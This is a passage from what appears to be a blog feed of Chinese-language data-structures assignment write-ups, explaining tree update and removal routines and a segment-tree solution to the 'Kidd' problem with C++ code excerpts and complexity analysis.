(若右兄不存在, 即编号为 <code>0</code>, 那么会返回 tree[0].suffix, 即 <code>0</code>).</p><h4 id="int-Readnode"><a href="#int-Readnode" class="headerlink" title="int Readnode()"></a>int Readnode()</h4><p><code>Readnode()</code> 读入一条路径, 并返回这条路径上的最后一个合法节点编号, <code>real_node</code> 表示当前已读入路径对应的合法节点, <code>tmp_node</code> 表示读入下一个座位后节点的状态, 若为 <code>0</code>, 说明已经进入了无效路径, 直接将之后路径截断即可 (即只读入数据而不对 <code>real_node</code> 进行更新).</p><h4 id="void-Update"><a href="#void-Update" class="headerlink" title="void Update()"></a>void Update()</h4><p>对于每次删除和插入子树, 要在操作位置进行 <code>size</code>, <code>height</code>, <code>suffix</code> 的更新. 其中 <code>height</code>, <code>suffix</code> 的更新比较一致, 将其写作接口 <code>Update()</code>.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 102</span><span class="token keyword">void</span> <span class="token function">Update</span><span class="token punctuation">(</span><span class="token keyword">int</span> tmp<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 更新 suffix.</span>        tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">)</span> <span class="token punctuation">{</span>            tmp <span class="token operator">=</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// 更新 height.</span>        tmp <span class="token operator">=</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>suffix</code> 存储的是节点本身及其后缀兄弟节点的最大 <code>height</code>, 因此对于修改过的节点, 只需要顺次更新其前缀兄弟的 <code>suffix</code>, 当自身已是长子节点时, 更新其父亲的 <code>height</code> 与 <code>suffix</code>, 并以其父亲节点为基准继续更新前缀节点.</p><h4 id="void-Remove"><a href="#void-Remove" class="headerlink" title="void Remove()"></a>void Remove()</h4><p>对于要删去的节点 <code>remove_node</code>, 首先特判其左右兄弟的存在性, 若都存在则将其左兄弟的右兄设置为其右兄弟, 其右兄弟的左兄设置为其左兄弟. 否则 <code>remove_node</code> 必然是其父节点的长子节点或幼子节点, 只需相应进行更新. 最后将 <code>remove_node</code> 的左右兄弟及父亲置为 <code>0</code> 即可.</p><p>随后对全树进行更新. 更新 <code>size</code> 只需沿着 <code>remove_node</code> 的父节点向上, 逐次减去 <code>tree[remove_node].size</code> 即可. 接着更新 <code>height</code> 与 <code>suffix</code>, 若 <code>remove_node</code> 的左兄存在, 直接对其进行 <code>Update()</code> 即可; 否则转到 <code>tree[remove_node].parent</code>, 更新其 <code>height</code>, 并进行 <code>Update()</code>.</p><h4 id="void-Insert"><a href="#void-Insert" class="headerlink" title="void Insert()"></a>void Insert()</h4><p>对于插入的父节点 <code>attach_node</code>, 源子树节点 <code>insert_node</code>, 插入位置 <code>rank</code>, 首先设置 <code>insert_node</code> 父亲为 <code>attach_node</code>. 若父节点无子节点, 则设置 <code>firstchild</code>, <code>lastchild</code> 均为 <code>insert_node</code>. 否则特判插入位置是否为 <code>firstchild</code> 或 <code>lastchild</code> 节点, 并相应进行更新, 原理同 <code>Remove()</code>.</p><p>随后对全树进行更新. 更新 <code>size</code> 只需沿着 <code>insert_node</code> 的父节点向上, 逐次加上 <code>tree[insert_node].size</code> 即可. 接着更新 <code>height</code> 与 <code>suffix</code>, 直接从 <code>insert_node</code> 开始进行 <code>Update()</code>.</p><h4 id="void-Input"><a href="#void-Input" class="headerlink" title="void Input()"></a>void Input()</h4><p>直接读取操作序列并进行操作即可.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>由于数据规模 <code>N</code> 为 <code>1, 1e6</code>, 在初始化时若采用后序遍历的递归版本, 会导致爆栈 (事实上, 我自行构造了一条单链的特殊情况, 在这种情况下, 程序不会正常返回), 因此采用了后序遍历的迭代版本.</li><li>初始化叶节点时, 原本进行了 <code>tree[x].suffix = 0</code>, 事实上需要修改为 <code>tree[x].suffix = tree[tree[x].succ].suffix</code>, 因为叶节点右边的兄弟的高度未必为 <code>0</code>.</li><li>在 <code>Remove()</code> 中更新父节点的高度时, 需要特判父节点是否无子节点.</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 143</span>tmp <span class="token operator">=</span> parent<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">else</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在进行子树移动操作时, 需要在读入 <code>remove_node</code> 后立刻进行 <code>Remove()</code> 操作, 随后进行读入 <code>attach_node</code> 并进行 <code>Insert()</code> 操作. 否则若读入 <code>remove_node</code> 后紧接读入 <code>attach_node</code>, 会导致没有更新删除节点而产生读入错误, 导致进入死循环, 产生 <code>TLE</code> 错误.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><code>InitTree()</code> 过程仅仅与全树节点数目有关系, 每一个节点入栈、出栈、初始化各一次, 时间复杂度为 $O(n)$;</p><p><code>Remove()</code> 与 <code>Insert()</code> 过程中, 在寻找相应节点的时间复杂度为 $O(cost)$, 更新 <code>size</code> 只与树深有关, 更新 <code>height</code> 和 <code>suffix</code> d等价于反向的查找过程, 时间复杂度为 $O(cost)$;</p><p>子树查询仅消耗访问内存常数时间, 时间复杂度为 $O(m)$.</p><p>综上, 算法总时间复杂度为 $O(n + cost + m)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>算法空间复杂度主要来自读取并存储数据的过程:</p><p>每个 <code>node</code> 类对象都存储了常数个成员, 消耗常数空间, 总体空间消耗为 $O(n)$.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 23</span>class node <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span>    <span class="token keyword">int</span> firstchild<span class="token punctuation">;</span>    <span class="token keyword">int</span> lastchild<span class="token punctuation">;</span>    <span class="token keyword">int</span> pred<span class="token punctuation">;</span>    <span class="token keyword">int</span> succ<span class="token punctuation">;</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">int</span> suffix<span class="token punctuation">;</span>    <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">parent</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">firstchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lastchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">succ</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">height</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">*</span>tree<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 192</span>tree <span class="token operator">=</span> new node<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kidd</title>
      <link href="/28/"/>
      <url>/28/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-4-2-Kidd"><a href="#3-4-2-Kidd" class="headerlink" title="3-4-2 Kidd"></a>3-4-2 Kidd</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题需使用 <code>Segment Tree</code> 数据结构, 为此我们使用 <code>tree[]</code> 记录一条线段的权值之和, 使用 <code>label[]</code> 进行懒惰标记.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 5</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 9</span>ll tree<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 使用 tree[] 来模拟一棵线段树.</span>ll label<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 懒惰标记.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出的卡牌数为 $n\in[1, 2^{31})$, 显然不可能以此作为叶节点规模建立一棵线段树; 由于给出的卡牌操作序列数为 $m\in[1, 200000]$, 其包含的端点数最多为 $400000$, 我们将这些端点排序、去重之后, 得到新的 $k$ 个端点, 记录在 <code>arr[]</code> 中, 并对这 $k$ 个端点和它们分出来的 $k - 1$ 个区间这个假想的扩充数组建立线段树.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 5</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 11</span>ll arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 对离散化的线段端点序列进行排序与去重.</span>ll operations<span class="token punctuation">[</span>MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录操作序列.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体而言, 若去重排序后留下的端点为 ${0, 2, 6, 10, 11}$, 那么我们只需对 ${[0, 0], [1, 1], [2, 2], [3, 5], [6, 6], [7, 9], [10, 10], [11, 10], [11, 11]}$ 建立线段树. 同时我们为每个区间 $[a, b]$ 定义长度 $real_length(a, b) = b - a + 1$, 注意到这里出现的不合理区间 $[11, 10]$ 的长度被定义为 $0$, 一定程度上便于我们进行理解 (这相当于一个空区间).</p><h4 id="读入数据"><a href="#读入数据" class="headerlink" title="读入数据"></a>读入数据</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 94</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> type <span class="token operator">&gt;&gt;</span> x <span class="token operator">&gt;&gt;</span> y<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token char">'H'</span><span class="token punctuation">)</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读入数据时, 记录下每次操作的具体内容, 并将操作序列的端点记录在 <code>arr[]</code> 中.</p><h4 id="重排序与建树"><a href="#重排序与建树" class="headerlink" title="重排序与建树"></a>重排序与建树</h4><p>使用 <code>&lt;stdlib.h&gt;</code> 中的 <code>qsort()</code> 函数对读入的 <code>arr[]</code> 序列进行排序;</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 22</span>ll <span class="token function">uniquify_array</span> <span class="token punctuation">(</span>ll<span class="token operator">*</span> arr<span class="token punctuation">,</span> ll length<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">++</span>r <span class="token operator">&lt;</span> length<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">!=</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token operator">++</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    length <span class="token operator">=</span> <span class="token operator">++</span>l<span class="token punctuation">;</span>    <span class="token keyword">return</span> length<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>uniquify_array()</code> 对有序序列 <code>arr[]</code> 进行去重, 参考了课件 <code>02-D1</code> 部分的算法.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 107</span>maxcnt <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>maxcnt</code> 即为线段树的规模大小, 无需进行初始化.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 109</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    left <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    right <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> maxcnt<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> cout <span class="token operator">&lt;&lt;</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> maxcnt<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>arr</code> 中记录排序与去重后的离散化的线段端点, 那么我们假想的扩充数组的长度为 <code>maxcnt = 2 * cnt - 1</code>. 对于每一次操作给出的端点 <code>x</code>, <code>y</code>, 我们通过二分查找得到其在 <code>arr[]</code> 中的坐标 <code>left</code>, <code>right</code>, 其在扩充数组中的对应的端点为 <code>2 * left</code>, <code>2 * right</code>.</p><p>以下函数参数中的 <code>k</code>, <code>l</code>, <code>r</code> 分别代表树的编号, 编号为 <code>k</code> 的树的左端点, 编号为 <code>k</code> 的树的右端点, <code>x</code>, <code>y</code> 分别代表操作区间的左端点, 右端点.</p><h4 id="push-down操作"><a href="#push-down操作" class="headerlink" title="push_down操作"></a>push_down操作</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 39</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> ll num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+=</span> num <span class="token operator">*</span> <span class="token function">real_length</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+=</span> num<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>update()</code> 更新编号为 <code>k</code> 的树的线段和和与懒惰标记, 即此时我们不进行数据的下放, 而是以懒惰标记的形式将其暂存在 <code>label[]</code> 内.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 45</span><span class="token keyword">void</span> <span class="token function">push_down</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> label<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> label<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>push_down</code> 操作分别更新左右子树的和与懒惰标记, 并且将自身懒惰标记置零.</p><h4 id="翻牌操作"><a href="#翻牌操作" class="headerlink" title="翻牌操作"></a>翻牌操作</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 34</span>ll <span class="token function">real_length</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> ll<span class="token operator">*</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>r <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> arr<span class="token punctuation">[</span>l <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>l <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>real_length()</code> 线段树中两端点间的实际线段长度, 我们使用实际长度对 <code>tree[k]</code> 进行更新与维护.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 53</span><span class="token keyword">void</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> r <span class="token operator">||</span> y <span class="token operator">&lt;</span> l<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> l <span class="token operator">&amp;&amp;</span> y <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">update</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">push_down</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">,</span> 